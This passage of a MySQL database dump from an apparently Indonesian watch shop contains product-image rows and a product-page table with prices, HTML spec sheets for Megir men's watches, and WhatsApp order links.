(180,29,'creative_content','products-1564494174.jpg',NULL,'active','2019-07-30 13:42:54','2019-07-30 13:42:54','no'),
(181,29,'creative_content','products-1564494180.jpg',NULL,'active','2019-07-30 13:43:00','2019-07-30 13:43:00','no'),
(182,29,'creative_content','products-1564494188.JPG',NULL,'active','2019-07-30 13:43:08','2019-07-30 13:43:08','no'),
(183,29,'creative_content','products-1564494193.jpg',NULL,'active','2019-07-30 13:43:13','2019-07-30 13:43:13','no'),
(184,29,'creative_content','products-1564494201.jpg',NULL,'active','2019-07-30 13:43:21','2019-07-30 13:43:21','no'),
(185,29,'creative_content','products-1564494207.jpg',NULL,'active','2019-07-30 13:43:27','2019-07-30 13:43:27','no'),
(186,30,'creative_content','products-1564494307.jpg',NULL,'active','2019-07-30 13:45:07','2019-07-30 13:45:07','no'),
(187,30,'creative_content','products-1564494313.jpg',NULL,'active','2019-07-30 13:45:13','2019-07-30 13:45:13','no'),
(188,30,'creative_content','products-1564494318.jpg',NULL,'active','2019-07-30 13:45:18','2019-07-30 13:45:18','no'),
(189,30,'creative_content','products-1564494324.jpg',NULL,'active','2019-07-30 13:45:24','2019-07-30 13:45:24','no'),
(190,30,'creative_content','products-1564494330.jpg',NULL,'active','2019-07-30 13:45:30','2019-07-30 13:45:30','no'),
(191,30,'creative_content','products-1564494336.jpg',NULL,'active','2019-07-30 13:45:36','2019-07-30 13:45:36','no'),
(192,31,'creative_content','products-1564494438.jpg',NULL,'active','2019-07-30 13:47:18','2019-07-30 13:47:18','no'),
(193,31,'creative_content','products-1564494443.jpg',NULL,'active','2019-07-30 13:47:23','2019-07-30 13:47:23','no'),
(194,31,'creative_content','products-1564494448.jpg',NULL,'active','2019-07-30 13:47:28','2019-07-30 13:47:28','no'),
(195,31,'creative_content','products-1564494453.jpg',NULL,'active','2019-07-30 13:47:33','2019-07-30 13:47:33','no'),
(196,31,'creative_content','products-1564494458.jpg',NULL,'active','2019-07-30 13:47:38','2019-07-30 13:47:38','no'),
(197,32,'creative_content','products-1564496485.jpg',NULL,'active','2019-07-30 14:21:25','2019-07-30 14:21:25','no'),
(198,32,'creative_content','products-1564496492.JPG',NULL,'active','2019-07-30 14:21:32','2019-07-30 14:21:32','no'),
(199,32,'creative_content','products-1564496506.png',NULL,'active','2019-07-30 14:21:46','2019-07-30 14:21:46','no'),
(200,33,'creative_content','products-1564496626.jpg',NULL,'active','2019-07-30 14:23:46','2019-07-30 14:23:46','no'),
(201,33,'creative_content','products-1564496634.JPG',NULL,'active','2019-07-30 14:23:54','2019-07-30 14:23:54','no'),
(202,34,'creative_content','products-1564496744.jpg',NULL,'active','2019-07-30 14:25:44','2019-07-30 14:25:44','no'),
(203,34,'creative_content','products-1564496751.JPG',NULL,'active','2019-07-30 14:25:51','2019-07-30 14:25:51','no'),
(204,34,'creative_content','products-1564496760.jpg',NULL,'active','2019-07-30 14:26:00','2019-07-30 14:26:00','no'),
(205,35,'creative_content','products-1564496888.jpg',NULL,'active','2019-07-30 14:28:08','2019-07-30 14:28:08','no'),
(206,35,'creative_content','products-1564496894.jpg',NULL,'active','2019-07-30 14:28:14','2019-07-30 14:28:14','no'),
(207,35,'creative_content','products-1564496899.jpg',NULL,'active','2019-07-30 14:28:19','2019-07-30 14:28:19','no'),
(208,35,'creative_content','products-1564496904.jpg',NULL,'active','2019-07-30 14:28:24','2019-07-30 14:28:24','no'),
(209,35,'creative_content','products-1564496912.jpg',NULL,'active','2019-07-30 14:28:32','2019-07-30 14:28:32','no'),
(210,35,'creative_content','products-1564496916.jpg',NULL,'active','2019-07-30 14:28:36','2019-07-30 14:28:36','no'),
(211,36,'creative_content','products-1564497082.JPG',NULL,'active','2019-07-30 14:31:22','2019-07-30 14:31:22','no'),
(212,36,'creative_content','products-1564497087.JPG',NULL,'active','2019-07-30 14:31:27','2019-07-30 14:31:27','no'),
(213,36,'creative_content','products-1564497093.JPG',NULL,'active','2019-07-30 14:31:33','2019-07-30 14:31:33','no'),
(214,36,'creative_content','products-1564497100.jpg',NULL,'active','2019-07-30 14:31:40','2019-07-30 14:31:40','no'),
(215,36,'creative_content','products-1564497105.jpg',NULL,'active','2019-07-30 14:31:45','2019-07-30 14:31:45','no'),
(216,36,'model','products-1564497112.JPG',NULL,'active','2019-07-30 14:31:52','2019-07-30 14:31:52','no'),
(217,36,'model','products-1564497116.jpg',NULL,'active','2019-07-30 14:31:56','2019-07-30 14:31:56','no'),
(218,36,'creative_content','products-1564497122.jpg',NULL,'active','2019-07-30 14:32:02','2019-07-30 14:32:02','no'),
(219,37,'model','products-1564497248.jpg',NULL,'active','2019-07-30 14:34:08','2019-07-30 14:34:08','no'),
(220,37,'model','products-1564497253.jpg',NULL,'active','2019-07-30 14:34:13','2019-07-30 14:34:13','no'),
(221,37,'creative_content','products-1564497260.JPG',NULL,'active','2019-07-30 14:34:20','2019-07-30 14:34:20','no'),
(222,37,'creative_content','products-1564497265.jpg',NULL,'active','2019-07-30 14:34:25','2019-07-30 14:34:25','no'),
(223,37,'creative_content','products-1564497272.jpg',NULL,'active','2019-07-30 14:34:32','2019-07-30 14:34:32','no'),
(224,43,'creative_content','products-1564497662.JPG',NULL,'active','2019-07-30 14:41:02','2019-07-30 14:41:02','no'),
(225,43,'creative_content','products-1564497666.png',NULL,'active','2019-07-30 14:41:06','2019-07-30 14:41:06','no'),
(226,43,'creative_content','products-1564497671.JPG',NULL,'active','2019-07-30 14:41:11','2019-07-30 14:41:11','no'),
(227,43,'creative_content','products-1564497678.JPG',NULL,'active','2019-07-30 14:41:18','2019-07-30 14:41:18','no'),
(228,43,'creative_content','products-1564497686.jpg',NULL,'active','2019-07-30 14:41:26','2019-07-30 14:41:26','no'),
(229,43,'creative_content','products-1564497691.jpg',NULL,'active','2019-07-30 14:41:31','2019-07-30 14:41:31','no'),
(230,43,'creative_content','products-1564497702.jpg',NULL,'active','2019-07-30 14:41:42','2019-07-30 14:41:42','no'),
(231,44,'creative_content','products-1564497826.jpg',NULL,'active','2019-07-30 14:43:46','2019-07-30 14:43:46','no'),
(232,44,'creative_content','products-1564497831.jpg',NULL,'active','2019-07-30 14:43:51','2019-07-30 14:43:51','no'),
(233,44,'creative_content','products-1564497837.jpg',NULL,'active','2019-07-30 14:43:57','2019-07-30 14:43:57','no'),
(234,44,'creative_content','products-1564497843.jpg',NULL,'active','2019-07-30 14:44:03','2019-07-30 14:44:03','no'),
(235,44,'creative_content','products-1564497850.jpg',NULL,'active','2019-07-30 14:44:10','2019-07-30 14:44:10','no'),
(236,45,'creative_content','products-1564499201.jpg',NULL,'active','2019-07-30 15:06:41','2019-07-30 15:06:41','no'),
(237,45,'creative_content','products-1564499206.jpg',NULL,'active','2019-07-30 15:06:46','2019-07-30 15:06:46','no'),
(238,45,'creative_content','products-1564499213.jpg',NULL,'active','2019-07-30 15:06:53','2019-07-30 15:06:53','no'),
(239,45,'creative_content','products-1564499219.jpg',NULL,'active','2019-07-30 15:06:59','2019-07-30 15:06:59','no'),
(240,45,'creative_content','products-1564499224.jpg',NULL,'active','2019-07-30 15:07:04','2019-07-30 15:07:04','no'),
(241,45,'creative_content','products-1564499230.jpg',NULL,'active','2019-07-30 15:07:10','2019-07-30 15:07:10','no'),
(242,45,'creative_content','products-1564499235.jpg',NULL,'active','2019-07-30 15:07:15','2019-07-30 15:07:15','no'),
(243,46,'creative_content','products-1564499644.jpg',NULL,'active','2019-07-30 15:14:04','2019-07-30 15:14:04','no'),
(244,46,'creative_content','products-1564499649.jpg',NULL,'active','2019-07-30 15:14:09','2019-07-30 15:14:09','no'),
(245,46,'creative_content','products-1564499653.jpg',NULL,'active','2019-07-30 15:14:13','2019-07-30 15:14:13','no'),
(246,46,'creative_content','products-1564499658.jpg',NULL,'active','2019-07-30 15:14:18','2019-07-30 15:14:18','no'),
(247,46,'creative_content','products-1564499662.jpg',NULL,'active','2019-07-30 15:14:22','2019-07-30 15:14:22','no'),
(248,46,'creative_content','products-1564499667.jpg',NULL,'active','2019-07-30 15:14:27','2019-07-30 15:14:27','no'),
(249,46,'creative_content','products-1564499673.jpg',NULL,'active','2019-07-30 15:14:33','2019-07-30 15:14:33','no'),
(250,47,'creative_content','products-1564499796.jpg',NULL,'active','2019-07-30 15:16:36','2019-07-30 15:16:36','no'),
(251,47,'creative_content','products-1564499801.jpg',NULL,'active','2019-07-30 15:16:41','2019-07-30 15:16:41','no'),
(252,47,'creative_content','products-1564499805.jpg',NULL,'active','2019-07-30 15:16:45','2019-07-30 15:16:45','no'),
(253,49,'creative_content','products-1564500146.jpg',NULL,'active','2019-07-30 15:22:26','2019-07-30 15:22:26','no'),
(254,49,'creative_content','products-1564500152.jpg',NULL,'active','2019-07-30 15:22:32','2019-07-30 15:22:32','no'),
(255,49,'creative_content','products-1564500156.jpg',NULL,'active','2019-07-30 15:22:36','2019-07-30 15:22:36','no'),
(256,49,'creative_content','products-1564500162.jpg',NULL,'active','2019-07-30 15:22:42','2019-07-30 15:22:42','no'),
(257,49,'creative_content','products-1564500168.jpg',NULL,'active','2019-07-30 15:22:48','2019-07-30 15:22:48','no'),
(258,49,'creative_content','products-1564500173.jpg',NULL,'active','2019-07-30 15:22:53','2019-07-30 15:22:53','no'),
(259,49,'creative_content','products-1564500178.jpg',NULL,'active','2019-07-30 15:22:58','2019-07-30 15:22:58','no'),
(260,50,'creative_content','products-1564500487.jpg',NULL,'active','2019-07-30 15:28:07','2019-07-30 15:28:07','no'),
(261,50,'creative_content','products-1564500492.jpg',NULL,'active','2019-07-30 15:28:12','2019-07-30 15:28:12','no'),
(262,50,'creative_content','products-1564500497.jpg',NULL,'active','2019-07-30 15:28:17','2019-07-30 15:28:17','no'),
(263,50,'creative_content','products-1564500502.jpg',NULL,'active','2019-07-30 15:28:22','2019-07-30 15:28:22','no'),
(264,50,'creative_content','products-1564500507.jpg',NULL,'active','2019-07-30 15:28:27','2019-07-30 15:28:27','no'),
(265,51,'creative_content','products-1564500608.jpg',NULL,'active','2019-07-30 15:30:08','2019-07-30 15:30:08','no'),
(266,51,'creative_content','products-1564500614.jpg',NULL,'active','2019-07-30 15:30:14','2019-07-30 15:30:14','no'),
(267,51,'creative_content','products-1564500619.jpg',NULL,'active','2019-07-30 15:30:19','2019-07-30 15:30:19','no'),
(268,51,'creative_content','products-1564500624.jpg',NULL,'active','2019-07-30 15:30:24','2019-07-30 15:30:24','no'),
(269,51,'creative_content','products-1564500628.jpg',NULL,'active','2019-07-30 15:30:28','2019-07-30 15:30:28','no'),
(270,52,'creative_content','products-1564500794.jpg',NULL,'active','2019-07-30 15:33:14','2019-07-30 15:33:14','no'),
(271,52,'creative_content','products-1564500799.jpg',NULL,'active','2019-07-30 15:33:19','2019-07-30 15:33:19','no'),
(272,52,'creative_content','products-1564500805.jpg',NULL,'active','2019-07-30 15:33:25','2019-07-30 15:33:25','no');

/*Table structure for table `product_page` */

DROP TABLE IF EXISTS `product_page`;

CREATE TABLE `product_page` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `productName` varchar(55) DEFAULT NULL,
  `productSubname` varchar(55) DEFAULT NULL,
  `identityProduct` varchar(191) NOT NULL,
  `price` double DEFAULT NULL,
  `priceCoret` double DEFAULT NULL,
  `flashProduct` double NOT NULL DEFAULT '0',
  `content` text,
  `content_detail` text,
  `picture` varchar(100) DEFAULT NULL,
  `status` int(11) NOT NULL DEFAULT '1',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `order` int(10) DEFAULT NULL,
  `linkOrder` varchar(191) DEFAULT NULL,
  `linkPage` varchar(191) DEFAULT NULL,
  `whatsApp` varchar(191) DEFAULT NULL,
  `whatsAppContent` varchar(191) DEFAULT NULL,
  PRIMARY KEY (`id`,`identityProduct`)
) ENGINE=MyISAM AUTO_INCREMENT=61 DEFAULT CHARSET=utf8;

/*Data for the table `product_page` */

insert  into `product_page`(`id`,`productName`,`productSubname`,`identityProduct`,`price`,`priceCoret`,`flashProduct`,`content`,`content_detail`,`picture`,`status`,`created_at`,`updated_at`,`order`,`linkOrder`,`linkPage`,`whatsApp`,`whatsAppContent`) values 
(38,'Megir Lazy Original','Jam Pria Terlaris 2019','MegirLazy',325000,650000,90,NULL,'<h5><div style=\"text-align: center;\"><span style=\"font-family: inherit; color: rgb(0, 0, 0);\">Why We Love It !</span></div><div style=\"text-align: center;\"><span style=\"font-family: inherit; color: rgb(0, 0, 0);\"><br></span></div><div style=\"text-align: center;\"><span style=\"font-family: inherit; color: rgb(0, 0, 0);\">Karena setiap pria bermimpi memiliki arloji Sproty ELEGAN yang dapat mengekspresikan kepribadian mereka dan inilah pilihan terbaik untuk mewujudkan impian tersebut.</span></div></h5><div style=\"text-align: center;\"><br></div><div><br></div><div><span style=\"color: rgb(0, 0, 0);\">• Item Type: Quartz Wristwatches</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Style: Sport</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Movement: Quartz</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Material: Alloy</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Length: 23cm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Clasp Type: Buckle</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Water Resistance Depth: 3Bar</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature: Complete Calendar,Luminous Hands,Chronograph</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dial Diameter: 46.5mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Boxes &amp; Cases Material: Paper</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dial Window Material Type: Hardlex</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Shape: Round</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Material Type: Silicone</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Width: 24mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Thickness: 14mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Brand Name: MEGIR</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Color: Blue, whole black</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Style: Fashion, sport, causal</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band: silicone watch</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Item: Men Watch</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Type: Quartz watch</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Function: Chronograph watch</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature 1: Man Watch</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature 2: Relogio Masculino</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature 3: Reloj Hombre</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature 4: Sport watch</span></div>',NULL,0,'2019-07-07 00:00:00','2019-07-07 05:02:40',NULL,NULL,'https://sanporium.com/product-category/jam-tangan/','6282283401530','Hai Min, Saya Mau Pesan Jam Megir Lazy'),
(37,'Megir Maxim Original','Jam Pria Terlaris 2019','MegirMaxim',347000,540000,87,NULL,'<h5 style=\"text-align: center;\"><span style=\"font-weight: bold; color: rgb(0, 0, 0);\">Why We Love It !</span></h5><h5 style=\"text-align: center;\"><span style=\"font-weight: bold; color: rgb(0, 0, 0);\"><br>Karena setiap pria bermimpi memiliki arloji ELEGAN yang dapat mengekspresikan kepribadian mereka dan inilah pilihan terbaik untuk mewujudkan impian tersebut.</span></h5><div><br></div><div><span style=\"color: rgb(0, 0, 0);\">• Item Type: Quartz Wristwatches</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Style: Business</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Movement: Quartz</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Material: Alloy</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Length: 22cm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Clasp Type: Bracelet Clasp</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Water Resistance Depth: 3Bar</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature: Chronograph,Complete Calendar</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dial Diameter: 45mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Boxes &amp; Cases Material: Paper</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dial Window Material Type: Hardlex</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Shape: Round</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Material Type: Stainless Steel</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Width: 24mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Thickness: 12.5mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Brand Name: MEGIR</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Function: Time, calendar, chonograph</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Color: sliver Black, Whole black</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band: Stainless Steel</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Item: Quartz Watch</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Type: Men Watch</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Style: Business watch</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature 1: Military watch</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature 2: Wrist watch</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature 3: Relogio Masculino</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Gender: Men</span></div>',NULL,0,'2019-07-06 00:00:00','2019-07-06 20:31:20',NULL,NULL,'https://sanporium.com/product-category/jam-tangan/','6282283401530','Hai Min, Saya Mau Pesan Jam Megir Maxim'),
(30,'Megir Roselo Original','Jam Pria Terlaris 2019','MegirRoselo',375000,445000,85,NULL,'<h4><span style=\"color: rgb(0, 0, 0);\"><span style=\"font-weight: bold;\">General :&nbsp;</span></span></h4><h4></h4><h6 style=\"line-height: 1.6;\"><span style=\"font-weight: normal; color: rgb(0, 0, 0);\">Brand: MEGIR&nbsp;<br>Watch style: Casual,Fashion,Cool,Military,Trends in outdoor sports&nbsp;<br>Watches categories: Men&nbsp;<br>Available Color: Black,Brown</span></h6><h4><br><span style=\"font-weight: bold; color: rgb(0, 0, 0);\">Dial :</span></h4><h6 style=\"line-height: 1.6;\"><span style=\"color: rgb(0, 0, 0); font-weight: normal;\">Watch mirror: Mineral glass&nbsp;<br>Case material: Alloy&nbsp;<br>Display type: Analog&nbsp;<br>Movement type: Quartz watch&nbsp;<br>Shape of the dial: Round&nbsp;<br>Dial size: 4.7 x 4.7 x 1.45cm</span></h6><div><br></div><h4><span style=\"font-weight: bold; color: rgb(0, 0, 0);\">Band :</span></h4><h6 style=\"line-height: 1.6;\"><span style=\"font-weight: normal;\"><span style=\"color: rgb(0, 0, 0);\">Band material: Leather&nbsp;<br></span><span style=\"color: rgb(0, 0, 0);\">Clasp type: Pin buckle&nbsp;<br></span><span style=\"color: rgb(0, 0, 0);\">Band size: 23 x 2.4cm</span></span></h6><div><br></div><h4><span style=\"color: rgb(0, 0, 0); font-weight: bold;\">Function :</span></h4><div><br></div><h6 style=\"line-height: 1.6;\"><span style=\"font-weight: normal;\"><span style=\"color: rgb(0, 0, 0);\">Special features: Light,Date,IP plating&nbsp;<br></span><span style=\"color: rgb(0, 0, 0);\">Water resistance : 30 meters</span></span></h6>','1562315394.JPG',0,'2019-07-05 00:00:00','2019-07-05 09:16:47',NULL,NULL,'https://sanporium.com/product-category/jam-tangan/','6282283401530','Hai Min, Saya Mau Pesan Jam Megir Roselo'),
(35,'Megir Aqua Original','Jam Pria Terlaris 2019','MegirAqua',329000,555000,90,NULL,'<h5 style=\"text-align: center;\"><span style=\"color: rgb(0, 0, 0);\">Why We Love It !</span></h5><h5 style=\"text-align: center;\"><span style=\"color: rgb(0, 0, 0);\"><br>Karena setiap pria bermimpi memiliki arloji ELEGAN yang dapat mengekspresikan kepribadian mereka dan inilah pilihan terbaik untuk mewujudkan impian tersebut.</span></h5><div><br></div><p style=\"line-height: 1.6;\"><span style=\"font-weight: normal;\"><span style=\"color: rgb(0, 0, 0);\">Brand Name : MEGIR<br></span></span><span style=\"font-weight: normal;\"><span style=\"color: rgb(0, 0, 0);\">Item Type : Quartz Wristwatches<br></span></span><span style=\"font-weight: normal;\"><span style=\"color: rgb(0, 0, 0);\">Style : Business<br></span></span><span style=\"font-weight: normal;\"><span style=\"color: rgb(0, 0, 0);\">Movement : Quartz<br></span></span><span style=\"font-weight: normal;\"><span style=\"color: rgb(0, 0, 0);\">Case Material : Alloy<br></span></span><span style=\"font-weight: normal;\"><span style=\"color: rgb(0, 0, 0);\">Band Length : 25.5cm<br></span></span><span style=\"font-weight: normal;\"><span style=\"color: rgb(0, 0, 0);\">Clasp Type : Bracelet Clasp&nbsp;<br></span></span><span style=\"font-weight: normal;\"><span style=\"color: rgb(0, 0, 0);\">Water Resistance Depth : 3Bar&nbsp;<br></span></span><span style=\"font-weight: normal;\"><span style=\"color: rgb(0, 0, 0);\">Feature : Complete Calendar,Chronograph<br></span></span><span style=\"font-weight: normal;\"><span style=\"color: rgb(0, 0, 0);\">Dial Diameter : 40mm<br></span></span><span style=\"font-weight: normal;\"><span style=\"color: rgb(0, 0, 0);\">Boxes &amp; Cases Material : Paper<br></span></span><span style=\"font-weight: normal;\"><span style=\"color: rgb(0, 0, 0);\">Dial Window Material Type : Hardlex<br></span></span><span style=\"font-weight: normal;\"><span style=\"color: rgb(0, 0, 0);\">Case Shape : Rectangle<br></span></span><span style=\"font-weight: normal;\"><span style=\"color: rgb(0, 0, 0);\">Band Material Type : Stainless Steel<br></span></span><span style=\"font-weight: normal;\"><span style=\"color: rgb(0, 0, 0);\">Band Width : 22mm<br></span></span><span style=\"font-weight: normal;\"><span style=\"color: rgb(0, 0, 0);\">Case Thickness : 13.5mm<br></span></span><span style=\"font-weight: normal;\"><span style=\"color: rgb(0, 0, 0);\">Movement type : Multifunction chronograph quartz movement<br></span></span><span style=\"font-weight: normal;\"><span style=\"color: rgb(0, 0, 0);\">Function : Hours, minute, second, calendar, chonograph<br></span></span><span style=\"font-weight: normal;\"><span style=\"color: rgb(0, 0, 0);\">Item : Men Watch<br></span></span><span style=\"font-weight: normal;\"><span style=\"color: rgb(0, 0, 0);\">Type : Quartz Watches</span></span></p>',NULL,0,'2019-07-06 00:00:00','2019-07-06 19:35:07',NULL,NULL,'https://sanporium.com/product-category/jam-tangan/','6282283401530','Hai Min, Saya Mau Pesan Jam Megir Aqua'),
(36,'Megir CHR Original','Jam Pria Terlaris 2019','MegirCHR',289000,555000,87,NULL,'<h5 style=\"text-align: center;\"><span style=\"font-weight: bold; color: rgb(0, 0, 0);\">Why We Love It !</span></h5><h5 style=\"text-align: center;\"><span style=\"font-weight: bold; color: rgb(0, 0, 0);\"><br>Karena setiap pria bermimpi memiliki arloji ELEGAN yang dapat mengekspresikan kepribadian mereka dan inilah pilihan terbaik untuk mewujudkan impian tersebut.</span></h5><div><br></div><div><span style=\"color: rgb(0, 0, 0);\">• Item Type: Quartz Wristwatches</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Style: Fashion &amp; Casual</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Movement: Quartz</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Material: Alloy</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Length: 20.1cm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Clasp Type: Bracelet Clasp</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Water Resistance Depth: 3Bar</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature: Complete Calendar,Stop Watch,Chronograph</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dial Diameter: 43mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Boxes &amp; Cases Material: Paper</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dial Window Material Type: Hardlex</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Shape: Round</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Material Type: Stainless Steel</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Width: 23mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Thickness: 12mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Brand Name: MEGIR</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Movement type: Multifunction chronograph quartz movement</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Function: Hours,minute,second,calendar,chonograph</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Color: whole black, whole sliver, black case</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band: stainless steel</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Item: Men Watches</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Type: Quartz Watch</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Style: Fashion</span></div><div><br></div>',NULL,0,'2019-07-06 00:00:00','2019-07-06 19:56:22',NULL,NULL,'https://sanporium.com/product-category/jam-tangan/','6282283401530','Megir CHR'),
(32,'Megir Madona Original','Jam Pria Terlaris 2019','MegirMadona',375000,997000,90,NULL,'<h6 style=\"line-height: 1.6;\"><span style=\"color: rgb(0, 0, 0);\">General&nbsp;<br>Brand : MEGIR&nbsp;&nbsp;<br>Watches categories : Male table&nbsp;<br>Watch style : Business&nbsp;<br>Style elements : Big dial&nbsp;<br>Available Color : Black, Silver</span></h6><h6 style=\"line-height: 1.6;\"><span style=\"color: rgb(0, 0, 0);\"><br>Dial&nbsp;<br>Movement type : Quartz watch&nbsp;<br>Shape of the dial : Round&nbsp;<br>Display type : Analog&nbsp;<br>Case material : Alloy</span></h6><h6 style=\"line-height: 1.6;\"><span style=\"color: rgb(0, 0, 0);\"><br>Band&nbsp;<br>Band material: Stainless Steel&nbsp;<br>Clasp type: Folding clasp with safety</span></h6><h6 style=\"line-height: 1.6;\"><span style=\"color: rgb(0, 0, 0);\"><br>Function<br>Special features : Moving small three stitches&nbsp;<br>Water resistance : 30 meters</span></h6>',NULL,0,'2019-07-06 00:00:00','2019-07-06 18:05:34',NULL,NULL,'https://sanporium.com/product-category/jam-tangan/','6282283401530','Hai Min, Saya Mau Pesan Jam Megir Madona'),
(33,'Megir Luxiro Original','Jam Pria Terlaris 2019','MegirLuxiro',265000,575000,90,NULL,'<h6><span style=\"color: rgb(0, 0, 0);\">Main Features:</span></h6><h6><span style=\"color: rgb(0, 0, 0);\">- Working three sub-dials, display hour, minute, and second information clearly&nbsp;</span></h6><h6><span style=\"color: rgb(0, 0, 0);\">- With a round calendar window, you can see the date information easily</span></h6><h6><span style=\"color: rgb(0, 0, 0);\">- Stereoscopic scale provides you a steady feeling&nbsp;</span></h6><h6><span style=\"color: rgb(0, 0, 0);\">- High-grade case and strap with strong structure, more durable, not easy to fade</span></h6><h6><span style=\"color: rgb(0, 0, 0);\">- Two kinds of watch bands for choosing: business style stainless steel strap and casual style genuine leather</span></h6><h6></h6><h6><span style=\"color: rgb(0, 0, 0);\">- A great choice for a young man</span></h6><div><br></div><h6><span style=\"color: rgb(0, 0, 0);\">Specification :</span></h6><h6><span style=\"color: rgb(0, 0, 0);\"><br>General<br>Brand : MEGIR&nbsp;<br>Watch style : Fashion&nbsp;<br>Watches categories : Male table&nbsp;<br>Watch color : Silver</span></h6><h6><span style=\"color: rgb(0, 0, 0);\"><br>Dial<br>Case material : Alloy&nbsp;<br>Display type : Analog&nbsp;<br>Movement type : Quartz watch&nbsp;<br>Shape of the dial : Round&nbsp;<br>Dial size : 4.4 x 4.4 x 1.4 cm / 1.73 x 1.73 x 0.55 inches</span></h6><h6><span style=\"color: rgb(0, 0, 0);\"><br>Band<br>Band material : Stainless Steel&nbsp;<br>Clasp type : Folding clasp with safety&nbsp;<br>Band size : 24 x 2.2 cm / 9.45 x 0.87 inches</span></h6><h6><span style=\"color: rgb(0, 0, 0);\"><br>Function<br>Special features : Date,Working sub-dial&nbsp;<br>Water resistance : Life water resistant</span></h6>',NULL,0,'2019-07-06 00:00:00','2019-07-06 18:19:51',NULL,NULL,'https://sanporium.com/product-category/jam-tangan/','6282283401530','Hai Min, Saya Mau Pesan Jam Megir Luxiro'),
(34,'Megir  Axe Original','Jam Pria Terlaris 2019','MegirAxe',395000,785000,90,NULL,'<div><h5><div style=\"text-align: center;\"><span style=\"color: rgb(0, 0, 0); font-family: inherit;\">Why We Love It !</span></div><div style=\"text-align: center;\"><span style=\"color: rgb(0, 0, 0); font-family: inherit;\"><br></span></div><span style=\"color: rgb(0, 0, 0);\"><div style=\"text-align: center;\"><span style=\"font-family: inherit;\">Karena setiap pria bermimpi memiliki arloji ELEGAN yang dapat mengekspresikan kepribadian mereka dan inilah pilihan terbaik untuk mewujudkan impian tersebut.</span></div></span></h5><div style=\"text-align: center; \"><br></div></div><h6 style=\"line-height: 1.6;\"><span style=\"font-weight: normal; color: rgb(0, 0, 0);\">Brand Name:MEGIR<br>Movement:Quartz<br>Case Material:Alloy<br>Band Length:23.5inch<br>Clasp Type:Folding Clasp with Safety<br>Water Resistance Depth:3Bar<br>Style:Sport<br>Item Type:Quartz Wristwatches<br>Display type:Pointer<br>Intended for:male<br>Waterproof property:30M<br>Type of machine core:quartz<br>Dial diameter:52mm<br>Buckle style:Insurance buckle<br>Clasp material:Stainless steel<br>Band Material:Silica gel</span></h6>',NULL,0,'2019-07-06 00:00:00','2019-07-06 19:13:53',NULL,NULL,'https://sanporium.com/product-category/jam-tangan/','6282283401530','Hai Min, Saya Mau Pesan Jam Megir Axe'),
